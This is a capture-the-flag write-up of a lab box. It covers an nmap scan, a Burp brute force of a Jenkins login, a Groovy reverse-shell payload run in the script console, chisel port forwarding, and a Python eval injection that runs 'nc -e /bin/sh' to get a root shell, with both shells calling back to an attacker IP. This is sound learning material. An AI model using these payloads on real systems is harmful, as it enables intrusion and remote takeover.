# Recon

## PortScanning
command:```sudo nmap -A 10.150.150.38 -T4  -v -p-```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 14:10 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:10
Completed Parallel DNS resolution of 1 host. at 14:10, 0.03s elapsed
Initiating SYN Stealth Scan at 14:10
Scanning 10.150.150.38 [65535 ports]
Discovered open port 22/tcp on 10.150.150.38
Increasing send delay for 10.150.150.38 from 0 to 5 due to 801 out of 2002 dropped probes since last increase.
Increasing send delay for 10.150.150.38 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
SYN Stealth Scan Timing: About 5.50% done; ETC: 14:19 (0:08:52 remaining)
SYN Stealth Scan Timing: About 8.86% done; ETC: 14:21 (0:10:27 remaining)
SYN Stealth Scan Timing: About 20.33% done; ETC: 14:22 (0:09:52 remaining)
SYN Stealth Scan Timing: About 28.69% done; ETC: 14:23 (0:09:14 remaining)
SYN Stealth Scan Timing: About 35.51% done; ETC: 14:23 (0:08:34 remaining)
SYN Stealth Scan Timing: About 40.51% done; ETC: 14:23 (0:07:53 remaining)
SYN Stealth Scan Timing: About 45.47% done; ETC: 14:23 (0:07:13 remaining)
SYN Stealth Scan Timing: About 50.50% done; ETC: 14:23 (0:06:32 remaining)
SYN Stealth Scan Timing: About 55.85% done; ETC: 14:23 (0:05:49 remaining)
SYN Stealth Scan Timing: About 60.94% done; ETC: 14:23 (0:05:08 remaining)
SYN Stealth Scan Timing: About 66.10% done; ETC: 14:23 (0:04:27 remaining)
SYN Stealth Scan Timing: About 71.44% done; ETC: 14:23 (0:03:45 remaining)
SYN Stealth Scan Timing: About 76.43% done; ETC: 14:23 (0:03:05 remaining)
SYN Stealth Scan Timing: About 81.58% done; ETC: 14:23 (0:02:25 remaining)
Discovered open port 30609/tcp on 10.150.150.38
SYN Stealth Scan Timing: About 86.71% done; ETC: 14:23 (0:01:45 remaining)
SYN Stealth Scan Timing: About 91.72% done; ETC: 14:23 (0:01:05 remaining)
Completed SYN Stealth Scan at 14:23, 806.19s elapsed (65535 total ports)
Initiating Service scan at 14:23
Scanning 2 services on 10.150.150.38
Completed Service scan at 14:23, 11.91s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.150.150.38
Retrying OS detection (try #2) against 10.150.150.38
Retrying OS detection (try #3) against 10.150.150.38
Retrying OS detection (try #4) against 10.150.150.38
Retrying OS detection (try #5) against 10.150.150.38
Initiating Traceroute at 14:24
Completed Traceroute at 14:24, 0.22s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:24
Completed Parallel DNS resolution of 2 hosts. at 14:24, 0.06s elapsed
NSE: Script scanning 10.150.150.38.
Initiating NSE at 14:24
Completed NSE at 14:24, 4.91s elapsed
Initiating NSE at 14:24
Completed NSE at 14:24, 0.72s elapsed
Initiating NSE at 14:24
Completed NSE at 14:24, 0.00s elapsed
Nmap scan report for 10.150.150.38
Host is up (0.16s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 646302cb00444a0f951a348d4e60381c (RSA)
|   256 0a6e1095de3d6d4b985ff0cfcbf5799e (ECDSA)
|_  256 0804040851d2b4a403bb02712f660969 (ED25519)
2494/tcp  filtered bmc-ar
2723/tcp  filtered watchdog-nt
4257/tcp  filtered vrml-multi-use
30609/tcp open     http           Jetty 9.4.27.v20200227
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(9.4.27.v20200227)
32764/tcp filtered unknown
35194/tcp filtered unknown
36062/tcp filtered unknown
41421/tcp filtered unknown
44696/tcp filtered unknown
45647/tcp filtered unknown
48256/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/9%OT=22%CT=1%CU=38678%PV=Y%DS=2%DC=T%G=Y%TM=6432BC81
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=FE%TI=Z%CI=Z%II=I%TS=C)OPS(O1
OS:=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW
OS:7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=
OS:Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 5.088 days (since Tue Apr  4 12:17:12 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   216.14 ms 10.66.66.1
2   216.14 ms 10.150.150.38

NSE: Script Post-scanning.
Initiating NSE at 14:24
Completed NSE at 14:24, 0.00s elapsed
Initiating NSE at 14:24
Completed NSE at 14:24, 0.00s elapsed
Initiating NSE at 14:24
Completed NSE at 14:24, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 840.51 seconds
           Raw packets sent: 70444 (3.104MB) | Rcvd: 67808 (2.716MB)
```
From our scan we have more filtered ports compared to open ports. The open ports here are port 22 which runs ssh and port 30609 which runs http. Our enumeration today will be focused on port 30609.




# Enumeration 
Going to the webpage, we get this

![image](https://user-images.githubusercontent.com/67879936/230775703-28076519-91bb-4815-b001-866a69097594.png)

This webpage is running Jenkins, to access the page we have to login. Lets go ahead and search for default creds

![image](https://user-images.githubusercontent.com/67879936/230775812-c18bb87f-ea34-4ead-8f63-adfeb90d9195.png)

so we can assume that the username is ```admin```, but getting the password will be a bit of an issue. Lets try to bruteforce the password using burpsuite

![image](https://user-images.githubusercontent.com/67879936/230775958-3db286da-c9eb-42e3-95e0-00877afd42be.png)
![image](https://user-images.githubusercontent.com/67879936/230775963-f88dee97-d8a4-421d-ace4-fe35087de540.png)

Sending this to burp intruder

![image](https://user-images.githubusercontent.com/67879936/230776066-ca3f7807-4db8-4467-9c98-fd008dbd32df.png)
![image](https://user-images.githubusercontent.com/67879936/230776283-7d1624ec-f660-49e0-af14-b1adc0a7f389.png)

Uesd that wordlist from Seclists, click on start attack after loading your password wordlist.

![image](https://user-images.githubusercontent.com/67879936/230776378-48950a63-409b-4393-a768-a87b3ab7e046.png)

we found our password hehe. Now, lets try to login

```username:admin```             ```password:matrix```

![image](https://user-images.githubusercontent.com/67879936/230776407-42050e30-dc80-40a4-a52e-b0faf75e50f0.png)
![image](https://user-images.githubusercontent.com/67879936/230776519-962416c3-b1ef-4c56-8be9-0ff87f41a79d.png)

cool, we are logged in. 




# Exploitation
Looking around the webpage, you should see this

![image](https://user-images.githubusercontent.com/67879936/230776632-d9a919fd-e7eb-449f-8187-03a220a00287.png)

scrolling down, you should find this

![image](https://user-images.githubusercontent.com/67879936/230776671-9ba428bf-edba-4795-a837-5cb771256c3f.png)
![image](https://user-images.githubusercontent.com/67879936/230776696-1ff12aeb-f0e4-4bba-83c0-dae731cf337e.png)

so, we can run a groovy script in that console. Lets try to run a simple groovy program.

script:```println "Hello, world!"```

This should print ```Hello, world!``` to the console.

![image](https://user-images.githubusercontent.com/67879936/230776893-c20d38cf-acce-4fe3-892f-28291ec2dc97.png)

cool, so we can use this to get a reverse shell bacl to our machine by putting our malicious payload into the script.

payload: ```String host="10.66.67.114";int port=1234;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();```

We'll be using this to get our reverse shell.  Ensure you edit the $host and $port to yours.

Also, before running the script ensure you set up your netcat listener

![image](https://user-images.githubusercontent.com/67879936/230777229-8d45029e-05ba-4a88-a33f-ce8ea37290b1.png)

on the netcat listener,

![image](https://user-images.githubusercontent.com/67879936/230777280-5d553cca-8eb8-46be-a1dd-7cdf986f5271.png)

cool, we got our shell

![image](https://user-images.githubusercontent.com/67879936/230777391-0eb36670-d41f-4954-bd9c-e100cbeffa7f.png)

Checking the user's home directory

![image](https://user-images.githubusercontent.com/67879936/230777459-7eb15c5d-e67e-44fe-af9c-d7cf335be823.png)

oops, we don't have access to view any file here because they all belong to user ```juniordev```. Lets go ahead and escalate our privileges



# Privilege Escalation
Lets try to display all open tcp connections on this box

command:```netstat -antup```

![image](https://user-images.githubusercontent.com/67879936/230777758-806e176b-a8c8-4bcc-80e9-11ba52572a74.png)

cool, we found something. A port ```8080``` running on localhost. We'll be portforwarding here and we'll be using a tool called ```chisel``` to do this.

![image](https://user-images.githubusercontent.com/67879936/230777988-a0435308-38f0-4719-8f39-7f78b160703e.png)
![image](https://user-images.githubusercontent.com/67879936/230778143-eee590cc-9176-4461-bca6-9dcd48fd9a82.png)

Now, lets run this tool

on attacker's machine:```chisel server -p 9001 --reverse```
on target's machine:```chisel client <ur ip>:9001 R:8080:127.0.0.1:8080```

![image](https://user-images.githubusercontent.com/67879936/230778358-9d9324de-3d22-469e-94f9-c0106d57b0b8.png)
![image](https://user-images.githubusercontent.com/67879936/230778370-27ea0126-e58f-4acc-ac95-21d9d7ae11bc.png)

cool, now lets visit this webpage ```http://127.0.0.1:8080/```. You should get this

![image](https://user-images.githubusercontent.com/67879936/230778434-59e5ea45-eaa3-45fb-a7ce-4bc787c7649a.png)

Checking the source page

![image](https://user-images.githubusercontent.com/67879936/230778531-a5f29e7b-2761-44ee-b7a4-13ea3048e680.png)

Lets check that path out

![image](https://user-images.githubusercontent.com/67879936/230778581-76649bb2-4dcd-437c-a481-9f709ea15f52.png)

nice, we got ```FLAG 71``` already. 

Moving on, playing around the webpage I noticed it helps us with adding numbers, but how does this help us in getting a reverse shell lool. Checking the page source again

![image](https://user-images.githubusercontent.com/67879936/230779004-a7f401ab-1113-482f-a2be-99a13d43841d.png)

I actually found out this is a python web app. Lets try to capture the request on burpsuite

![image](https://user-images.githubusercontent.com/67879936/230779184-d113b284-a1ad-42b5-8dc7-3dde9d9e9511.png)
![image](https://user-images.githubusercontent.com/67879936/230779233-5e8d1c23-0974-48d3-afb6-4d5278450f6c.png)

cool, send it over to burp repeater

I read this [article](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html) on exploiting command injection in python web apps.

I found a payload that got me a reverse shell back to my machine

payload:```eval('__import__(\'os\').popen(\'nc+10.66.67.114+1337+-e+/bin/sh\').read()')```

![image](https://user-images.githubusercontent.com/67879936/230779765-2426d9f8-367b-4974-bf86-592fa24e8a17.png)

on your netcat listener

![image](https://user-images.githubusercontent.com/67879936/230779798-cb59958e-1f08-4361-8bfa-d7969e18f198.png)

cool hehe, we got a shell as the ```root``` user. 

Out of 4 flags, we've gotten only one so far. Lets look for the other three

![image](https://user-images.githubusercontent.com/67879936/230779965-8d1f6010-002b-409a-95f1-4fbb551a07a3.png)

Found a flag in the ```/root``` directory

We'll be using the ```find``` command to look for the remaining 2

command:```find / 2>/dev/null | grep -i FLAG70```

![image](https://user-images.githubusercontent.com/67879936/230780175-84706abf-11ae-4fcc-a037-54d344d4dae2.png)

Found another one in the ```/var/lib/jenkins``` directory

Using the  ```find``` command again

command:```find / 2>/dev/null | grep -i FLAG69```

![image](https://user-images.githubusercontent.com/67879936/230780562-ebd5a965-862c-47f6-a7a5-951a096ab2f4.png)

Found the last flag in the ```/var/lib/jenkins/users/FLAG69_7705914462374786576``` directory.


That will be all for today
<br> <br>
[Back To Home](../../index.md)


















